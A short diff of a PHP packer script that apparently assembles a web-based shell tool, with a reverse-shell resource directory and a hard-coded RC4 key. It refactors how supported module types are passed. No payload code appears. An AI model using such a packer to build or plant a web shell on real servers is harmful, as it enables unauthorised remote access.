@@ -20,6 +20,7 @@ $GLOBALS['packer']['network_rs_dir'] = "./network/rs/";
 $GLOBALS['packer']['resources_dir'] = "./resources/";
 
 $debug_rc4_key = "QtIRzust76zO1haRabFYkbBv9WDnGvTx";
+$supported_network_rs_types = array('executable', 'gcc', 'java', 'php', 'python');
 
 require $GLOBALS['packer']['base_dir'].'jsPacker.php';
 
@@ -74,7 +75,7 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
         $js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
         $js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");
 
-        list($mc, $jc) = load_modules_data($modules);
+        list($mc, $jc) = load_modules_data($modules, $supported_network_rs_types);
         $module_code .= $mc;
         $js_code .= $jc;
 
@@ -126,7 +127,7 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
 		$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
 		$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");
 
-        list($mc, $jc) = load_modules_data($modules);
+        list($mc, $jc) = load_modules_data($modules, $supported_network_rs_types);
         $module_code .= $mc;
         $js_code .= $jc;
 
@@ -401,7 +402,7 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
         // $js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."md5.js");
 		$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");
 
-        list($mc, $jc) = load_modules_data($modules);
+        list($mc, $jc) = load_modules_data($modules, $supported_network_rs_types);
         $module_code .= $mc;
         $js_code .= $jc;
 
@@ -424,10 +425,9 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
 	echo $output;
 }
 
-function load_modules_data($modules) {
+function load_modules_data($modules, $supported_types) {
     $module_code = "";
     $js_code = "";
-    $supported_types = array('executable', 'gcc', 'java', 'php', 'python');
     foreach($modules as $module){
         $module = trim($module);
         $filename = $GLOBALS['packer']['module_dir'].$module;
